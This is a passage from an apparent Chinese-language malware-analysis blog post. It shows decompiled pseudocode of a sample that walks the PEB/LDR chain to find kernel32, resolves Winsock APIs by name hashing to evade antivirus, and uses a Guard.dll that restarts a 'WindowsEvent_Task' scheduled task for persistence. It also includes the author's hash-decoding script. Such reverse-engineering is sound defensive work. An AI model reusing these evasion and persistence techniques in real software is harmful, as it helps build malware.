sub_747(v9, <span class="number">0x313A84C8</span>, pFnGetProcAddress);<span class="comment">// htons</span></span><br><span class="line">  v25 = sub_747(v9, <span class="number">0x92B50DA</span>, pFnGetProcAddress);<span class="comment">// connect</span></span><br><span class="line">  v26 = sub_747(v9, <span class="number">0xF8387DC</span>, pFnGetProcAddress);<span class="comment">// send</span></span><br><span class="line">  v27 = sub_747(v9, <span class="number">0xF6134B2</span>, pFnGetProcAddress);<span class="comment">// recv</span></span><br><span class="line">  v28 = sub_747(v9, <span class="number">0x14AC161B</span>, pFnGetProcAddress);<span class="comment">// closesocket</span></span><br><span class="line">  v29 = sub_747(v9, <span class="number">0x4FF42CCF</span>, pFnGetProcAddress);<span class="comment">// WSACleanup</span></span><br><span class="line">  <span class="keyword">if</span> ( !v20(<span class="number">514</span>, v36) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v32 + <span class="number">40</span>) )</span><br><span class="line">        sub_33A(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_4DF(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v32 + <span class="number">52</span>) )</span><br><span class="line">        sub_33A(<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_4DF(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遍历-LDR-链获取-kernel32"><a href="#遍历-LDR-链获取-kernel32" class="headerlink" title="遍历 LDR 链获取 kernel32"></a>遍历 LDR 链获取 kernel32</h4><p>注意以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = *(<span class="type">int</span> ***)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">0xC</span>) + <span class="number">0x14</span>); ; i = (<span class="type">int</span> **)*i )<span class="comment">// 从 fs 寄存器提取 peb 地址（fs:[0x30]），</span></span><br><span class="line">                                              <span class="comment">// 然后跳转到 ldr 链，读取 InMemoryOrderModuleList 链</span></span><br><span class="line">                                              <span class="comment">// 此时 i = 结构体成员 InMemoryOrderLinks 链地址</span></span><br><span class="line">                                              <span class="comment">// 开始遍历</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">  &#123;</span><br><span class="line">    hKernel32 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = (<span class="type">unsigned</span> __int16 *)i[<span class="number">10</span>];             <span class="comment">// 0x8(InMemoryOrderModuleList 距离结构体起始位置)</span></span><br><span class="line">                                              <span class="comment">// +0x24(到 BaseDllName)</span></span><br><span class="line">                                              <span class="comment">// +0x4(到其中的 Buffer) BaseDllName-&gt;Buffer 地址</span></span><br><span class="line">                                              <span class="comment">// 于是这就是为什么偏移为 10（汇编显示 0x28）</span></span><br><span class="line">                                              <span class="comment">// https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING</span></span><br><span class="line">  v2 = *((<span class="type">unsigned</span> __int16 *)i + <span class="number">18</span>) &gt;&gt; <span class="number">1</span>;    <span class="comment">// 除以 2？WCHAR？</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; v2; --v2 )                     <span class="comment">// 计算哈希，匹配函数名</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *v1++;                               <span class="comment">// 每次读取一个 unicode</span></span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x61</span> )</span><br><span class="line">      LOWORD(v4) = v4 - <span class="number">0x20</span>;</span><br><span class="line">    j = (<span class="type">unsigned</span> __int16)v4 + <span class="number">131</span> * j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (j &amp; <span class="number">0x7FFFFFFF</span>) == <span class="number">0x1CCA9CE6</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个 <code>__readfsdword(0x30u)</code>，一开始不理解是什么意思。后面问了 ai 发现 <code>fs</code> 段寄存器总会存放 teb 结构的指针。<br>有关 teb、peb 的由来和在 shellcode 中的用途可以参考以下这几篇文章，解释得非常好：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266678.htm">https://bbs.kanxue.com/thread-266678.htm</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1612">https://forum.butian.net/share/1612</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10491">https://xz.aliyun.com/news/10491</a></p>
</blockquote>
<p>简单来讲，就是 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_TEB32">teb</a> 结构体的 0x18 位置存放着 teb 结构体自身的地址（因为不可能直接从 fs 寄存器得到 teb 结构体的地址信息，fs 只是个段选择器）， 得到 teb 结构体的地址后，从 teb 中的 +0x30 位置（x86 下），存放着指向 peb 结构体的指针，<a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_PEB">peb</a> 存放了有关进程的信息。<br>而 peb 结构体中又存放了一条链 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_PEB_LDR_DATA">ldr</a> <code>struct _PEB_LDR_DATA* Ldr</code>（0xC 偏移——x86 的），存放了当前进程中模块的链表信息。<br>其中的 <code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code> 都是双向链表类型 <code>_LIST_ENTRY</code>，但是并非如此，它们实际的类型应该是 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_LDR_DATA_TABLE_ENTRY"><code>_LDR_DATA_TABLE_ENTRY</code></a>，这个结构体的前几个成员如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                                  <span class="comment">//0x8</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>                          <span class="comment">//0x10</span></span><br><span class="line">VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                                     <span class="comment">//0x24</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                                     <span class="comment">//0x2c</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>其中的 <code>InLoadOrderLinks</code>、<code>InMemoryOrderLinks</code>、<code>InInitializationOrderLinks</code> 分别都指向了下一个模块的 <code>InLoadOrderLinks</code>、<code>InMemoryOrderLinks</code>、<code>InInitializationOrderLinks</code>（此处要注意运算问题，这三者指向的位置不同，距离结构体的起始位置也不同，计算时要注意，可以看看上面推荐的几篇帖子里提到的内容。）<br>通过其中一条链找到下一个模块的地址，然后比较 <code>BaseDllName</code>（中的 <a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING"><code>Buffer</code></a>）计算得到的哈希结果是否与 <code>0x1CCA9CE6</code> 相等，即要找的模块。这里要查找的是 <code>kernel32.dll</code>。</p>
<h4 id="sub-747-——hash-匹配（免杀）"><a href="#sub-747-——hash-匹配（免杀）" class="headerlink" title="sub_747()——hash 匹配（免杀）"></a><code>sub_747()</code>——hash 匹配（免杀）</h4><p>下面这一段代码依旧是解析 dll 的 pe 头，找到 eat 导出表然后遍历来获取指定的函数。与前面查找 <code>kernel32.dll</code> 的做法类似。<br>（也是又复习了一次导出表）</p>
<p>最终解密的结果都在前面那个函数的注释里了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_747@&lt;eax&gt;(<span class="type">int</span> a1@&lt;esi&gt;, <span class="type">int</span> a2, <span class="type">int</span> (__stdcall *a3)(<span class="type">int</span>, _BYTE *))</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *eat_rva; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *eat; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> rva_names; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> rva_funcs; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> addr_ordinals; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> addr_names_1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> addr_funcs; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num_names_1; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> addr_ordinals_1; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  eat_rva = (_DWORD *)(*(_DWORD *)(a1 + <span class="number">0x3C</span>) + a1 + <span class="number">0x78</span>);<span class="comment">// +0x3c 获取 nt 头地址</span></span><br><span class="line">                                                <span class="comment">// +0x78 获取 eat rva</span></span><br><span class="line">  <span class="keyword">if</span> ( !*eat_rva )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(*(_DWORD *)(a1 + <span class="number">0x3C</span>) + a1 + <span class="number">0x7C</span>) )<span class="comment">// +0x7c eat size</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  eat = (_DWORD *)(a1 + *eat_rva);              <span class="comment">// IMAGE_EXPORT_DIRECTORY</span></span><br><span class="line">  num_names_1 = eat[<span class="number">6</span>];                         <span class="comment">// NumberOfNames</span></span><br><span class="line">  <span class="keyword">if</span> ( !num_names_1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  rva_names = eat[<span class="number">8</span>];                           <span class="comment">// AddressOfNames</span></span><br><span class="line">  rva_funcs = eat[<span class="number">7</span>];                           <span class="comment">// AddressOfFunctions</span></span><br><span class="line">  addr_ordinals = a1 + eat[<span class="number">9</span>];                  <span class="comment">// AddressOfNameOrdinals</span></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  addr_names_1 = a1 + rva_names;</span><br><span class="line">  addr_funcs = a1 + rva_funcs;</span><br><span class="line">  addr_ordinals_1 = addr_ordinals;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (_BYTE *)(a1 + *(_DWORD *)(addr_names_1 + <span class="number">4</span> * v8));</span><br><span class="line">    v18 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( *v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = *v11;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v13 = v12 + <span class="number">131</span> * v13;                  <span class="comment">// 计算哈希</span></span><br><span class="line">        v12 = *++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v18 );</span><br><span class="line">      addr_ordinals = addr_ordinals_1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">0x7FFFFFFF</span>) == a2 )             <span class="comment">// 比较哈希</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = v17 + <span class="number">1</span>;</span><br><span class="line">    v17 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= num_names_1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    <span class="keyword">return</span> a3(a1, v11);                         <span class="comment">// GetProcAddress 直接导出</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> a1 + *(_DWORD *)(addr_funcs + <span class="number">4</span> * *(<span class="type">unsigned</span> __int16 *)(addr_ordinals + <span class="number">2</span> * v17));<span class="comment">// ordinals 导出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="手搓脚本解密（忽略）"><a href="#手搓脚本解密（忽略）" class="headerlink" title="手搓脚本解密（忽略）"></a>手搓脚本解密（忽略）</h5><p>（因为没有动态环境所以只能搓一个脚本解密了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">IsForwarder</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* lpszName)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strstr</span>(lpszName, <span class="string">&quot;.&quot;</span>) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">HashCalc</span><span class="params">(<span class="type">char</span>* lpszName, <span class="type">unsigned</span> <span class="type">int</span> * dwHash)</span></span><br><span class="line">&#123;</span><br><span class="line">    *dwHash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*lpszName)</span><br><span class="line">    &#123;</span><br><span class="line">        *dwHash = *lpszName + <span class="number">131</span> * *dwHash;</span><br><span class="line">        lpszName++;</span><br><span class="line">    &#125;</span><br><span class="line">    *dwHash &amp;= <span class="number">0x7fffffff</span>;</span><br><span class="line">    lpszName++;</span><br><span class="line">    <span class="keyword">return</span> lpszName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dwHash;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* pModule;</span><br><span class="line">    <span class="type">char</span>* eat;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dwExportRVA;</span><br><span class="line">    <span class="type">int</span> dwNumberOfNames;</span><br><span class="line">    <span class="type">char</span>* pNames;</span><br><span class="line">    <span class="comment">//HMODULE hMod = LoadLibraryA(&quot;C:\\Windows\\SysWOW64\\kernel32.dll&quot;);</span></span><br><span class="line">    <span class="comment">//HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span></span><br><span class="line">    <span class="comment">//HMODULE hMod = GetModuleHandleA(&quot;ntdll.dll&quot;);</span></span><br><span class="line">    HMODULE hMod = LoadLibraryA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hMod == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pModule = (<span class="type">unsigned</span> <span class="type">char</span>*)hMod;</span><br><span class="line">    <span class="comment">// 获取 eat 位置</span></span><br><span class="line">    dwExportRVA = *(<span class="type">int</span>*)(pModule + *(pModule + <span class="number">0x3c</span>) + <span class="number">0x78</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;export directory @%#x\n&quot;</span>, dwExportRVA);</span><br><span class="line">    eat = (<span class="type">char</span> *)(pModule + dwExportRVA);</span><br><span class="line">    <span class="comment">// 获取 AddressOfNames 地址</span></span><br><span class="line">    <span class="comment">// 索引从 0 开始注意</span></span><br><span class="line">    dwNumberOfNames = *(<span class="type">int</span> *)(eat + <span class="number">4</span> * <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dwNumberOfNames);</span><br><span class="line">    pNames = (<span class="type">char</span> *)(pModule + *(<span class="type">int</span>*)(eat + <span class="number">4</span> * <span class="number">8</span>));</span><br><span class="line">    pNames = (<span class="type">char</span>*)(pModule + *(<span class="type">int</span> *)pNames);</span><br><span class="line">    <span class="comment">//printf(&quot;%x %s\n&quot;, HashCalc(pNames), pNames);</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumberOfNames; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsForwarder(pNames))<span class="comment">// 跳过转发器函数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                pNames++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (*pNames);</span><br><span class="line">            pNames++;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, pNames);</span><br><span class="line">        pNames = HashCalc(pNames, &amp;dwHash);<span class="comment">// 传入的是地址不是变量，所以不能直接修改参数达到修改外部变量的目的。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#X&quot;</span>, dwHash);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FreeLibrary(hMod);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-33A-sub-4DF-外部通信（未完成）"><a href="#sub-33A-sub-4DF-外部通信（未完成）" class="headerlink" title="sub_33A() &#x2F; sub_4DF() 外部通信（未完成）"></a><code>sub_33A()</code> &#x2F; <code>sub_4DF()</code> 外部通信（未完成）</h4><p>这一部分没办法完全静态分析，基本上都是通过各种变量来调用函数。<br><del>（以后配置好环境了再回来动调看一下。）</del></p>
<h2 id="Guard-dll-1"><a href="#Guard-dll-1" class="headerlink" title="Guard.dll"></a>Guard.dll</h2><p>直接用工具分析 pe，会发现导出表中仅导出了一个函数 <code>MonitorAndRestart</code>。</p>
<h3 id="MonitorAndRestart"><a href="#MonitorAndRestart" class="headerlink" title="MonitorAndRestart()"></a><code>MonitorAndRestart()</code></h3><p>创建了一个互斥体，然后判断 <code>WindowsEvent.exe</code> 运行与否，选择是否执行计划任务。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="string">L&quot;Global\\ProcessMonitorDLL_Mutex&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">sub_10001040(CommandLine, <span class="number">256</span>, <span class="string">L&quot;schtasks /run /tn \&quot;%s\&quot;&quot;</span>, <span class="string">L&quot;WindowsEvent_Task&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>完整伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">HANDLE __stdcall <span class="title function_">MonitorAndRestart</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, LPCCH lpMultiByteStr, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// ecx</span></span><br><span class="line">  DWORD LastError; <span class="comment">// [esp-4h] [ebp-584h]</span></span><br><span class="line">  DWORD ExitCode; <span class="comment">// [esp+Ch] [ebp-574h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+10h] [ebp-570h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOW</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+28h] [ebp-558h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [esp+70h] [ebp-510h] BYREF</span></span><br><span class="line">  WCHAR WideCharStr[<span class="number">17</span>]; <span class="comment">// [esp+170h] [ebp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">486</span>]; <span class="comment">// [esp+192h] [ebp-3EEh] BYREF</span></span><br><span class="line">  WCHAR CommandLine[<span class="number">258</span>]; <span class="comment">// [esp+378h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="string">L&quot;Global\\ProcessMonitorDLL_Mutex&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hObject &amp;&amp; GetLastError() == <span class="number">183</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hObject;</span><br><span class="line">    <span class="keyword">if</span> ( hObject )</span><br><span class="line">      <span class="keyword">return</span> (HANDLE)CloseHandle(hObject);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  wcscpy(WideCharStr, <span class="string">L&quot;WindowsEvent.exe&quot;</span>);</span><br><span class="line">  sub_100026C0(v12, <span class="number">0</span>, <span class="number">486</span>);</span><br><span class="line">  <span class="keyword">if</span> ( lpMultiByteStr &amp;&amp; *lpMultiByteStr )</span><br><span class="line">  &#123;</span><br><span class="line">    MultiByteToWideChar(<span class="number">0</span>, <span class="number">0</span>, lpMultiByteStr, <span class="number">-1</span>, WideCharStr, <span class="number">260</span>);</span><br><span class="line">    sub_10001080(WideCharStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_100011A0(WideCharStr) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    sub_10001080(&amp;unk_10020F18);</span><br><span class="line">    sub_100026C0(CommandLine, <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">    sub_10001040(CommandLine, <span class="number">256</span>, <span class="string">L&quot;schtasks /run /tn \&quot;%s\&quot;&quot;</span>, <span class="string">L&quot;WindowsEvent_Task&quot;</span>);</span><br><span class="line">    StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">    sub_100026C0(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span 